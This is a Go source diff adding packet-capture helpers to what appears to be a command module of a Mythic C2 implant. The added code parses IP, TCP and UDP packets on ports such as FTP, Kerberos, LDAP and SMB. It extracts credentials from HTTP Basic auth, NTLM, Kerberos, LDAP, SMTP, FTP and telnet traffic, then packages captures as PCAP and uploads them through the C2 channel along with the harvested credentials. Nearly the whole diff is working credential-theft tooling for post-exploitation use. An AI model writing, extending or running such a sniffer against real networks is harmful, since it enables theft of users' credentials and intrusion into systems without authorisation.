@@ -2,7 +2,10 @@ package commands
 
 import (
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
+	"net"
+	"strings"
 	"sync"
 	"time"
 
@@ -119,6 +122,135 @@ type packetMeta struct {
 	DstIP   string
 	SrcPort uint16
 	DstPort uint16
+}
+
+func sniffApplyDefaults(params *sniffParams) []uint16 {
+	if params.Duration <= 0 {
+		params.Duration = 30
+	}
+	if params.Duration > 300 {
+		params.Duration = 300
+	}
+	if params.MaxBytes <= 0 {
+		params.MaxBytes = 50 * 1024 * 1024
+	}
+	var ports []uint16
+	if params.Ports != "" {
+		for _, p := range strings.Split(params.Ports, ",") {
+			p = strings.TrimSpace(p)
+			var port int
+			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
+				ports = append(ports, uint16(port))
+			}
+		}
+	}
+	if len(ports) == 0 {
+		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
+	}
+	return ports
+}
+
+type sniffPacketResult struct {
+	Meta    packetMeta
+	Payload []byte
+}
+
+func sniffParseIPPacket(ipData []byte) *sniffPacketResult {
+	if len(ipData) < 20 {
+		return nil
+	}
+	ihl := int(ipData[0]&0x0F) * 4
+	proto := ipData[9]
+	if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
+		return nil
+	}
+	totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
+	if totalLen > len(ipData) {
+		totalLen = len(ipData)
+	}
+	if ihl > totalLen {
+		return nil
+	}
+	meta := packetMeta{
+		SrcIP: net.IP(ipData[12:16]).String(),
+		DstIP: net.IP(ipData[16:20]).String(),
+	}
+	transportData := ipData[ihl:totalLen]
+	var payload []byte
+	if proto == 6 {
+		if len(transportData) < 20 {
+			return nil
+		}
+		meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+		meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+		dataOff := int(transportData[12]>>4) * 4
+		if dataOff < 20 || dataOff > len(transportData) {
+			return nil
+		}
+		payload = transportData[dataOff:]
+	} else {
+		if len(transportData) < 8 {
+			return nil
+		}
+		meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+		meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+		payload = transportData[8:]
+	}
+	if len(payload) == 0 {
+		return nil
+	}
+	return &sniffPacketResult{Meta: meta, Payload: payload}
+}
+
+func sniffMatchPort(ports []uint16, srcPort, dstPort uint16) bool {
+	for _, p := range ports {
+		if srcPort == p || dstPort == p {
+			return true
+		}
+	}
+	return false
+}
+
+func sniffExtractCredentials(payload []byte, meta *packetMeta, result *sniffResult, ftpTracker *sniffFTPTracker, telnetTracker *sniffTelnetTracker) {
+	if cred := sniffExtractHTTPBasicAuth(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if meta.DstPort == 21 || meta.SrcPort == 21 {
+		if cred := ftpTracker.process(payload, meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
+	}
+	if cred := sniffExtractNTLM(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if cred := sniffExtractKerberos(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if cred := sniffExtractDNS(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if cred := sniffExtractLDAP(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if cred := sniffExtractSMTPAuth(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+	if cred := telnetTracker.process(payload, meta); cred != nil {
+		result.Credentials = append(result.Credentials, cred)
+	}
+}
+
+func sniffFinalizeResult(task *structs.Task, result *sniffResult, startTime time.Time, pcapCollector *sniffPCAPCollector, linkType uint32) structs.CommandResult {
+	result.Duration = time.Since(startTime).Truncate(time.Second).String()
+	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
+		pcapData := pcapCollector.buildPCAP(linkType)
+		sniffUploadPCAP(task, pcapData, result)
+	}
+	output, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
+	return successResult(string(output))
 }
 
 // sniffUploadPCAP uploads a PCAP file to Mythic using the file transfer channel.
